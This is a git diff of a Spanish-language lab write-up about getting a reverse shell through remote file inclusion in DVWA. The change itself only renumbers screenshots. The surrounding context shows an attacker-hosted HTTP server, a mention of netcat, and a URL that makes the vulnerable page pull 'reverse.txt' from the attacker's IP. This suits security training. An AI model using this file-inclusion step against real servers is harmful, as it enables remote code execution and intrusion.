@@ -44,6 +44,7 @@ Para obtner la shell reversa, usaremos netcat tanto en el atacante (kali) como e
   python3 -m http.server 80
   ```
   ![](capturas/remote-file-inclusion-2.png)
+  ![](capturas/remote-file-inclusion-3.png)
 
 
 ### En la máquina víctima
@@ -51,9 +52,8 @@ Utilizamos la URL en la que conseguimos hacer LFI:
 ```
 /DVWA/vulnerabilities/fi/?page=http://192.168.1.103/reverse.txt
 ```
-![](capturas/remote-file-inclusion-3.png)
-
+![](capturas/remote-file-inclusion-4.png)
 
 ### En la máquina atacante
 Vemos que se ha conseguido finalizar la shell reversa:
-![](capturas/remote-file-inclusion-4.png)
+![](capturas/remote-file-inclusion-5.png)
